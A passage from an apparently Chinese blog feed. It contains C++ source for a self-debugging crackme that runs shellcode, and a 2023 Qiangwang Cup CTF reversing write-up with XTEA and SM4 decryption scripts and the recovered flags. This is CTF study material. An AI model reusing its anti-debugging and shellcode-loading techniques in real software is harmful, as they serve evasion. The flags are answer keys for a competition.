class="built_in">sizeof</span>(UINT16);</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>( pop ) </span></span><br><span class="line">        Hash += Hash &gt;&gt; <span class="number">11</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (Rem)</span><br><span class="line">    {</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">    {</span><br><span class="line">        Hash += <span class="built_in">Get16Bits</span>(String);</span><br><span class="line">        Hash ^= Hash &lt;&lt; <span class="number">16</span>;</span><br><span class="line">        Hash ^= ((UCHAR)String[<span class="built_in">sizeof</span>(UINT16)]) &lt;&lt; <span class="number">18</span>;</span><br><span class="line">        Hash += Hash &gt;&gt; <span class="number">11</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    {</span><br><span class="line">        Hash += <span class="built_in">Get16Bits</span>(String);</span><br><span class="line">        Hash ^= Hash &lt;&lt; <span class="number">11</span>;</span><br><span class="line">        Hash ^= Hash &gt;&gt; <span class="number">17</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    {</span><br><span class="line">        Hash += (UCHAR)*String;</span><br><span class="line">        Hash ^= Hash &lt;&lt; <span class="number">10</span>;</span><br><span class="line">        Hash += Hash &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    Hash ^= Hash &lt;&lt; <span class="number">3</span>;</span><br><span class="line">    Hash += Hash &gt;&gt; <span class="number">5</span>;</span><br><span class="line">    Hash ^= Hash &lt;&lt; <span class="number">4</span>;</span><br><span class="line">    Hash += Hash &gt;&gt; <span class="number">17</span>;</span><br><span class="line">    Hash ^= Hash &lt;&lt; <span class="number">25</span>;</span><br><span class="line">    Hash += Hash &gt;&gt; <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Hash;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">HandleException</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> DEBUG_EVENT&amp; ev,</span></span></span><br><span class="line"><span class="params"><span class="function">    HANDLE ph,</span></span></span><br><span class="line"><span class="params"><span class="function">    HANDLE th)</span> </span>{</span><br><span class="line"></span><br><span class="line">    CONTEXT ctx{};</span><br><span class="line">    ctx.ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER;</span><br><span class="line">    BOOL ret = <span class="built_in">GetThreadContext</span>(th, &amp;ctx);</span><br><span class="line">    <span class="built_in">assert</span>(ret);</span><br><span class="line"></span><br><span class="line">    BYTE buf[<span class="number">2</span>]{};</span><br><span class="line">    BYTE nops[] = { <span class="number">0x90</span>,<span class="number">0x90</span> };</span><br><span class="line">    BYTE ret_nop[] = { <span class="number">0xc3</span>,<span class="number">0x90</span> };</span><br><span class="line">    SIZE_T actually_read = <span class="number">0</span>;</span><br><span class="line">    ret = <span class="built_in">ReadProcessMemory</span>(</span><br><span class="line">        ph, (<span class="type">void</span>*)ctx.Rip, buf, <span class="number">2</span>, &amp;actually_read);</span><br><span class="line">    <span class="built_in">assert</span>(ret);</span><br><span class="line">    <span class="type">char</span> str_x[<span class="number">2</span>] = { <span class="number">0</span> };</span><br><span class="line">    <span class="keyword">if</span> (buf[<span class="number">0</span>] == <span class="number">0x0f</span> &amp;&amp; buf[<span class="number">1</span>] == <span class="number">0x0b</span>) {</span><br><span class="line">        <span class="comment">//printf("UD2 Found\n");</span></span><br><span class="line">        str_x[<span class="number">0</span>] = ctx.R12 % <span class="number">256</span>;</span><br><span class="line">        UINT32 hash = <span class="built_in">HashStringSuperFastHashA</span>(str_x);</span><br><span class="line">        <span class="comment">//printf("%d , %p , %c\n", ctx.R13, ctx.R11, str_x[0]);</span></span><br><span class="line">        <span class="keyword">if</span> (hash == ctx.R11 &amp;&amp; ctx.R13 == <span class="number">1</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="comment">//printf("%c,%d\n", ctx.R12 % 256, counter);</span></span><br><span class="line">            counter++;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (counter == <span class="number">24</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Correct Flag :)\n"</span>);</span><br><span class="line">            ret = <span class="built_in">WriteProcessMemory</span>(</span><br><span class="line">                ph, (<span class="type">void</span>*)ctx.Rip, ret_nop, <span class="number">2</span>, &amp;actually_read);</span><br><span class="line">            <span class="built_in">SetThreadContext</span>(th, &amp;ctx);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (counter != <span class="number">24</span>)</span><br><span class="line">        {</span><br><span class="line">            ret = <span class="built_in">WriteProcessMemory</span>(</span><br><span class="line">                ph, (<span class="type">void</span>*)ctx.Rip, nops, <span class="number">2</span>, &amp;actually_read);</span><br><span class="line">            <span class="built_in">SetThreadContext</span>(th, &amp;ctx);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Debugger</span><span class="params">(<span class="type">char</span>* file_name)</span> </span>{</span><br><span class="line">    <span class="comment">//puts("Debugger");</span></span><br><span class="line">    _putenv(<span class="string">"ix221iscc221=1"</span>);</span><br><span class="line"></span><br><span class="line">    STARTUPINFO si{};</span><br><span class="line">    si.cb = <span class="built_in">sizeof</span>(si);</span><br><span class="line">    PROCESS_INFORMATION pi{};</span><br><span class="line">    BOOL ret = <span class="built_in">CreateProcess</span>(</span><br><span class="line">        file_name, <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">        FALSE,</span><br><span class="line">        DEBUG_PROCESS,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        &amp;si, &amp;pi);</span><br><span class="line"></span><br><span class="line">    DEBUG_EVENT ev;</span><br><span class="line">    std::unordered_map&lt;DWORD, HANDLE&gt; threads;</span><br><span class="line"></span><br><span class="line">    threads[pi.dwThreadId] = pi.hThread;</span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> the_end = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">while</span> (!the_end) {</span><br><span class="line"></span><br><span class="line">        ret = <span class="built_in">WaitForDebugEvent</span>(&amp;ev, INFINITE);</span><br><span class="line">        <span class="keyword">if</span> (!ret) {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Weird failed: %u\n"</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (ev.dwDebugEventCode) {</span><br><span class="line">        <span class="keyword">case</span> EXCEPTION_DEBUG_EVENT:</span><br><span class="line"></span><br><span class="line">            <span class="built_in">HandleException</span>(ev, pi.hProcess, threads[ev.dwThreadId]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> EXIT_PROCESS_DEBUG_EVENT:</span><br><span class="line">            the_end = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> CREATE_THREAD_DEBUG_EVENT:</span><br><span class="line">            threads[ev.dwThreadId] = ev.u.CreateThread.hThread;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> EXIT_THREAD_DEBUG_EVENT:</span><br><span class="line">            <span class="built_in">CloseHandle</span>(threads[ev.dwThreadId]);</span><br><span class="line">            threads.<span class="built_in">erase</span>(ev.dwThreadId);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> CREATE_PROCESS_DEBUG_EVENT:</span><br><span class="line">            <span class="built_in">CloseHandle</span>(ev.u.CreateProcessInfo.hFile);</span><br><span class="line">            <span class="built_in">CloseHandle</span>(ev.u.CreateProcessInfo.hProcess);</span><br><span class="line">            <span class="built_in">CloseHandle</span>(ev.u.CreateProcessInfo.hThread);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> LOAD_DLL_DEBUG_EVENT:</span><br><span class="line">        <span class="keyword">case</span> UNLOAD_DLL_DEBUG_EVENT:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Weird: %u\n"</span>, ev.dwDebugEventCode);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="built_in">ContinueDebugEvent</span>(</span><br><span class="line">            ev.dwProcessId, ev.dwThreadId, DBG_CONTINUE);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Debuggee</span><span class="params">()</span> </span>{</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> input[<span class="number">25</span>] = { <span class="number">0</span> };</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Enter The Flag:\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;input);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> data[] =</span><br><span class="line">    { <span class="number">0x44</span>...... }; <span class="comment">// shellcode data块 省略</span></span><br><span class="line">    <span class="comment">//  ;</span></span><br><span class="line">    <span class="type">long</span> size = <span class="built_in">sizeof</span>(data);</span><br><span class="line">    PVOID image;</span><br><span class="line">    image = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(image, data, size);</span><br><span class="line">    <span class="built_in">void</span> (*foo)(<span class="type">unsigned</span> <span class="type">char</span>*) = (<span class="built_in">void</span>(*)(<span class="type">unsigned</span> <span class="type">char</span>*))image;</span><br><span class="line">    <span class="built_in">foo</span>(input);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> </span>{</span><br><span class="line">                </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">"ix221iscc221"</span>) == <span class="literal">nullptr</span>) {</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Debugger</span>(argv[<span class="number">0</span>]);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Debuggee</span>();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
      
      
      <categories>
          
          <category> 二进制学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向探究 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023强网杯WriteUp</title>
      <link href="/2023/12/18/2023%E5%BC%BA%E7%BD%91%E6%9D%AFWriteUp/"/>
      <url>/2023/12/18/2023%E5%BC%BA%E7%BD%91%E6%9D%AFWriteUp/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>2023-12-18创建的文件夹，搁到现在才上传，忘了，麻麻了</p><p>rev === 强ollvm杯</p><h1 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h1><p>Tls附加dbg</p><p>过掉</p><p>把程序运行，在这儿附加</p><p><img src="/2023/12/18/2023%E5%BC%BA%E7%BD%91%E6%9D%AFWriteUp/wps1.jpg" alt="img"> </p><p>静态密文，key都是假的</p><p><img src="/2023/12/18/2023%E5%BC%BA%E7%BD%91%E6%9D%AFWriteUp/wps2.jpg" alt="img"> </p><p>动调起来得到真的</p><p>密文</p><p><img src="/2023/12/18/2023%E5%BC%BA%E7%BD%91%E6%9D%AFWriteUp/wps3.jpg" alt="img"> </p><p>Key</p><p><img src="/2023/12/18/2023%E5%BC%BA%E7%BD%91%E6%9D%AFWriteUp/wps4.jpg" alt="img"> </p><p>这是delta</p><p><img src="/2023/12/18/2023%E5%BC%BA%E7%BD%91%E6%9D%AFWriteUp/wps5.jpg" alt="img"> </p><p>调到跳出循环，得到sum</p><p><img src="/2023/12/18/2023%E5%BC%BA%E7%BD%91%E6%9D%AFWriteUp/wps6.jpg" alt="img"> </p><p><img src="/2023/12/18/2023%E5%BC%BA%E7%BD%91%E6%9D%AFWriteUp/wps7.jpg" alt="img"> </p><p>Exp</p> <figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdint&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">XTEA_decrypt</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span> {</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> sum = <span class="number">0xd192c263</span>;</span><br><span class="line"><span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) {</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">33</span>; i++) {</span><br><span class="line">sum -= <span class="number">0x88408067</span>;</span><br><span class="line">v1 -= (key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + sum) ^ (v0 + ((v0 &gt;&gt; <span class="number">4</span>) ^ (v0 &lt;&lt; <span class="number">5</span>)));</span><br><span class="line">v0 -= (key[sum &amp; <span class="number">3</span>] + sum) ^ sum ^ (v1 + ((v1 &gt;&gt; <span class="number">4</span>) ^ (v1 &lt;&lt; <span class="number">5</span>)));</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">v[<span class="number">0</span>] = v0;</span><br><span class="line">v[<span class="number">1</span>] = v1;</span><br><span class="line"><span class="comment">//std::cout &lt;&lt; (v[0] &amp; 0xFF) &lt;&lt; ((v[0] &gt;&gt; 8) &amp; 0xFF)</span></span><br><span class="line"><span class="comment">//&lt;&lt; ((v[0] &gt;&gt; 16) &amp; 0xFF) &lt;&lt; ((v[0] &gt;&gt; 24) &amp; 0xFF);</span></span><br><span class="line"><span class="comment">//std::cout &lt;&lt; (v[1] &amp; 0xFF) &lt;&lt; ((v[1] &gt;&gt; 8) &amp; 0xFF)</span></span><br><span class="line"><span class="comment">//&lt;&lt; ((v[1] &gt;&gt; 16) &amp; 0xFF) &lt;&lt; ((v[1] &gt;&gt; 24) &amp; 0xFF);</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; (<span class="type">char</span>)(v[<span class="number">0</span>] &amp; <span class="number">0xFF</span>) &lt;&lt; (<span class="type">char</span>)((v[<span class="number">0</span>] &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>)</span><br><span class="line">&lt;&lt; (<span class="type">char</span>)((v[<span class="number">0</span>] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) &lt;&lt; (<span class="type">char</span>)((v[<span class="number">0</span>] &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; (<span class="type">char</span>)(v[<span class="number">1</span>] &amp; <span class="number">0xFF</span>) &lt;&lt; (<span class="type">char</span>)((v[<span class="number">1</span>] &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>)</span><br><span class="line">&lt;&lt; (<span class="type">char</span>)((v[<span class="number">1</span>] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) &lt;&lt; (<span class="type">char</span>)((v[<span class="number">1</span>] &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">}</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line"><span class="type">uint32_t</span> enc[] = { <span class="number">0x9523F2E0</span>, <span class="number">0x8ED8C293</span>, <span class="number">0x8668C393</span>, <span class="number">0xDDF250BC</span>, <span class="number">0x510E4499</span>, <span class="number">0x8C60BD44</span>, <span class="number">0x34DCABF2</span>, <span class="number">0xC10FD260</span> };</span><br><span class="line"><span class="type">uint32_t</span>  key[<span class="number">4</span>] = { <span class="number">0x62</span>, <span class="number">0x6F</span>, <span class="number">0x6D</span>, <span class="number">0x62</span> }; <span class="comment">// bomb</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i += <span class="number">2</span>) {</span><br><span class="line"><span class="type">uint32_t</span> tmp[<span class="number">2</span>];</span><br><span class="line">tmp[<span class="number">0</span>] = enc[i];</span><br><span class="line">tmp[<span class="number">1</span>] = enc[i + <span class="number">1</span>];</span><br><span class="line">XTEA_decrypt(tmp, key);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>flag{W31com3_2_Th3_QwbS7_4nd_H4v3_Fun}</p><h1 id="ezre"><a href="#ezre" class="headerlink" title="ezre"></a>ezre</h1><p>ida打开D810去ollvm混淆，start！</p><p>D810是插件  搜到直接用  前提：angr要装好</p><p><img src="/2023/12/18/2023%E5%BC%BA%E7%BD%91%E6%9D%AFWriteUp/wps8.jpg" alt="img"> </p><p>main函数无有用信息</p><p><img src="/2023/12/18/2023%E5%BC%BA%E7%BD%91%E6%9D%AFWriteUp/wps9.jpg" alt="img"> </p><p>SM4加密</p><p><img src="/2023/12/18/2023%E5%BC%BA%E7%BD%91%E6%9D%AFWriteUp/wps10.jpg" alt="img"> </p><p><img src="/2023/12/18/2023%E5%BC%BA%E7%BD%91%E6%9D%AFWriteUp/wps11.jpg" alt="img"> </p><p>也可以搜固定的数组</p><p><img src="/2023/12/18/2023%E5%BC%BA%E7%BD%91%E6%9D%AFWriteUp/wps12.jpg" alt="img"> </p><p><img src="/2023/12/18/2023%E5%BC%BA%E7%BD%91%E6%9D%AFWriteUp/wps13.jpg" alt="img"> </p><p>密文和密钥在这</p><p><img src="/2023/12/18/2023%E5%BC%BA%E7%BD%91%E6%9D%AFWriteUp/wps14.jpg" alt="img"> </p><p>Key :</p><p>0123456789ABCDEF0123456789ABCDEF</p><p>Cipher:</p><p>067519471663887C8B6655FF3F7D0D4AF5D24E383FE9C2DEDB7C7F6F74B11F3C</p><p>Flag:</p><p>flag{h3kk0_w0rld_sur3_3n0ugh}</p><p>cyberchef解</p><p><img src="/2023/12/18/2023%E5%BC%BA%E7%BD%91%E6%9D%AFWriteUp/wps15.jpg" alt="img"> </p><p>也可以脚本，贴一个自己去研究</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">using  namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Rotl(_x,_y) ((_x)<span class="string">&lt;&lt;(_y)|(_x)&gt;</span>&gt;(32-(_y)))  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SboxTrans(_A) (Sbox[(_A)&gt;&gt;24&amp;0xFF]<span class="string">&lt;&lt;24|Sbox[(_A)&gt;</span>&gt;16&amp;0xFF]<span class="string">&lt;&lt;16|Sbox[(_A)&gt;</span>&gt;8&amp;0xFF]&lt;&lt;8|Sbox[(_A)&amp;0xFF])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> L1(x) ((x)^Rotl(x,2)^Rotl(x,10)^Rotl(x,18)^Rotl(x,24))  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> L2(x) ((x)^Rotl(x,13)^Rotl(x,23))    </span></span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">int</span> CK[<span class="number">32</span>] = {</span><br><span class="line">    <span class="number">0x00070e15</span>, <span class="number">0x1c232a31</span>, <span class="number">0x383f464d</span>, <span class="number">0x545b6269</span>,</span><br><span class="line">    <span class="number">0x70777e85</span>, <span class="number">0x8c939aa1</span>, <span class="number">0xa8afb6bd</span>, <span class="number">0xc4cbd2d9</span>,</span><br><span class="line">    <span class="number">0xe0e7eef5</span>, <span class="number">0xfc030a11</span>, <span class="number">0x181f262d</span>, <span class="number">0x343b4249</span>,</span><br><span class="line">    <span class="number">0x50575e65</span>, <span class="number">0x6c737a81</span>, <span class="number">0x888f969d</span>, <span class="number">0xa4abb2b9</span>,</span><br><span class="line">    <span class="number">0xc0c7ced5</span>, <span class="number">0xdce3eaf1</span>, <span class="number">0xf8ff060d</span>, <span class="number">0x141b2229</span>,</span><br><span class="line">    <span class="number">0x30373e45</span>, <span class="number">0x4c535a61</span>, <span class="number">0x686f767d</span>, <span class="number">0x848b9299</span>,</span><br><span class="line">    <span class="number">0xa0a7aeb5</span>, <span class="number">0xbcc3cad1</span>, <span class="number">0xd8dfe6ed</span>, <span class="number">0xf4fb0209</span>,</span><br><span class="line">    <span class="number">0x10171e25</span>, <span class="number">0x2c333a41</span>, <span class="number">0x484f565d</span>, <span class="number">0x646b7279</span> };</span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">int</span> RK[<span class="number">4</span>] = { <span class="number">0xA3B1BAC6</span>, <span class="number">0x56AA3350</span>, <span class="number">0x677D9197</span>, <span class="number">0xB27022DC</span> };</span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> Sbox[<span class="number">256</span>] = {</span><br><span class="line">    <span class="number">0xd6</span>,<span class="number">0x90</span>,<span class="number">0xe9</span>,<span class="number">0xfe</span>,<span class="number">0xcc</span>,<span class="number">0xe1</span>,<span class="number">0x3d</span>,<span class="number">0xb7</span>,<span class="number">0x16</span>,<span class="number">0xb6</span>,<span class="number">0x14</span>,<span class="number">0xc2</span>,<span class="number">0x28</span>,<span class="number">0xfb</span>,<span class="number">0x2c</span>,<span class="number">0x05</span>,</span><br><span class="line">    <span class="number">0x2b</span>,<span class="number">0x67</span>,<span class="number">0x9a</span>,<span class="number">0x76</span>,<span class="number">0x2a</span>,<span class="number">0xbe</span>,<span class="number">0x04</span>,<span class="number">0xc3</span>,<span class="number">0xaa</span>,<span class="number">0x44</span>,<span class="number">0x13</span>,<span class="number">0x26</span>,<span class="number">0x49</span>,<span class="number">0x86</span>,<span class="number">0x06</span>,<span class="number">0x99</span>,</span><br><span class="line">    <span class="number">0x9c</span>,<span class="number">0x42</span>,<span class="number">0x50</span>,<span class="number">0xf4</span>,<span class="number">0x91</span>,<span class="number">0xef</span>,<span class="number">0x98</span>,<span class="number">0x7a</span>,<span class="number">0x33</span>,<span class="number">0x54</span>,<span class="number">0x0b</span>,<span class="number">0x43</span>,<span class="number">0xed</span>,<span class="number">0xcf</span>,<span class="number">0xac</span>,<span class="number">0x62</span>,</span><br><span class="line">    <span class="number">0xe4</span>,<span class="number">0xb3</span>,<span class="number">0x1c</span>,<span class="number">0xa9</span>,<span class="number">0xc9</span>,<span class="number">0x08</span>,<span class="number">0xe8</span>,<span class="number">0x95</span>,<span class="number">0x80</span>,<span class="number">0xdf</span>,<span class="number">0x94</span>,<span class="number">0xfa</span>,<span class="number">0x75</span>,<span class="number">0x8f</span>,<span class="number">0x3f</span>,<span class="number">0xa6</span>,</span><br><span class="line">    <span class="number">0x47</span>,<span class="number">0x07</span>,<span class="number">0xa7</span>,<span class="number">0xfc</span>,<span class="number">0xf3</span>,<span class="number">0x73</span>,<span class="number">0x17</span>,<span class="number">0xba</span>,<span class="number">0x83</span>,<span class="number">0x59</span>,<span class="number">0x3c</span>,<span class="number">0x19</span>,<span class="number">0xe6</span>,<span class="number">0x85</span>,<span class="number">0x4f</span>,<span class="number">0xa8</span>,</span><br><span class="line">    <span class="number">0x68</span>,<span class="number">0x6b</span>,<span class="number">0x81</span>,<span class="number">0xb2</span>,<span class="number">0x71</span>,<span class="number">0x64</span>,<span class="number">0xda</span>,<span class="number">0x8b</span>,<span class="number">0xf8</span>,<span class="number">0xeb</span>,<span class="number">0x0f</span>,<span class="number">0x4b</span>,<span class="number">0x70</span>,<span class="number">0x56</span>,<span class="number">0x9d</span>,<span class="number">0x35</span>,</span><br><span class="line">    <span class="number">0x1e</span>,<span class="number">0x24</span>,<span class="number">0x0e</span>,<span class="number">0x5e</span>,<span class="number">0x63</span>,<span class="number">0x58</span>,<span class="number">0xd1</span>,<span class="number">0xa2</span>,<span class="number">0x25</span>,<span class="number">0x22</span>,<span class="number">0x7c</span>,<span class="number">0x3b</span>,<span class="number">0x01</span>,<span class="number">0x21</span>,<span class="number">0x78</span>,<span class="number">0x87</span>,</span><br><span class="line">    <span class="number">0xd4</span>,<span class="number">0x00</span>,<span class="number">0x46</span>,<span class="number">0x57</span>,<span class="number">0x9f</span>,<span class="number">0xd3</span>,<span class="number">0x27</span>,<span class="number">0x52</span>,<span class="number">0x4c</span>,<span class="number">0x36</span>,<span class="number">0x02</span>,<span class="number">0xe7</span>,<span class="number">0xa0</span>,<span class="number">0xc4</span>,<span class="number">0xc8</span>,<span 